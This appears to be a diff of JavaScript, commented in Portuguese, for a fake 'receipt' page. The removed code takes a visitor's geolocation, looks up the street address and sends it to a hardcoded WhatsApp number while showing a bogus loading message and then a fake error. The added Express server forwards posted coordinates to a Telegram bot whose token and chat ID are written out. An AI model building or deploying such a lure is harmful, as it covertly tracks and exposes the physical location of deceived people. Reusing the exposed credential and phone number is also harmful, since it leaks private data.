@@ -1,58 +1,35 @@
-const button = document.getElementById('abrirComprovante');
-const comprovante = document.getElementById('comprovante');
+// server.js
+const express = require("express");
+const bodyParser = require("body-parser");
+const cors = require("cors");
+const axios = require("axios");
 
-button.addEventListener('click', () => {
-  // Mostra carregando para o cliente
-  comprovante.innerHTML = `
-    <h2>Processando Comprovante...</h2>
-    <p>Aguarde um momento.</p>
-  `;
+const app = express();
+app.use(cors());
+app.use(bodyParser.json());
 
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendLocationToWhatsApp, showError);
-  } else {
-    comprovante.innerHTML = "<h2>Seu navegador não suporta geolocalização.</h2>";
+const TELEGRAM_BOT_TOKEN = "7444709457:AAHlVnQNUuEy4yYXgue3lzslrXR55Hq4djw"; // Substitua pelo token do seu bot
+const TELEGRAM_CHAT_ID = "4600203343"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+
+app.post("/send-location", async (req, res) => {
+  const { latitude, longitude, maps } = req.body;
+
+  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;
+
+  try {
+    // Envia a localização para o Telegram
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+    });
+
+    res.status(200).json({ success: true });
+  } catch (error) {
+    console.log(error);
+    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
   }
 });
 
-function sendLocationToWhatsApp(position) {
-  const latitude = position.coords.latitude;
-  const longitude = position.coords.longitude;
-
-  // Chamada à API Nominatim para obter o endereço
-  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
-    .then(response => response.json())
-    .then(data => {
-      const endereco = data.address;
-      
-      // Tentando pegar a rua e número
-      const rua = endereco.road || "Rua não disponível";
-      const numero = endereco.house_number || endereco.suburb || "Número não disponível";
-
-      // Montando a mensagem para o WhatsApp
-      const mensagem = `Alguém abriu o comprovante! 
-Localização: Latitude: ${latitude} Longitude: ${longitude} 
-Endereço: ${rua}, ${numero}
-Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      const numeroWhatsApp = '5521991453401'; 
-
-      const url = `https://wa.me/${numeroWhatsApp}?text=${encodeURIComponent(mensagem)}`;
-      window.open(url, '_blank');
-
-     
-      setTimeout(() => {
-        comprovante.innerHTML = `
-          <h2>Comprovante Indisponível</h2>
-          <p>Houve um erro ao carregar o comprovante. Por favor, tente novamente mais tarde.</p>
-        `;
-      }, 3000);
-    })
-    .catch(error => {
-      comprovante.innerHTML = "<h2>Erro ao obter endereço.</h2>";
-    });
-}
-
-function showError(error) {
-  comprovante.innerHTML = "<h2>Erro ao obter localização.</h2>";
-}
+app.listen(8088, () => {
+  console.log("Servidor rodando na porta 8088");
+});
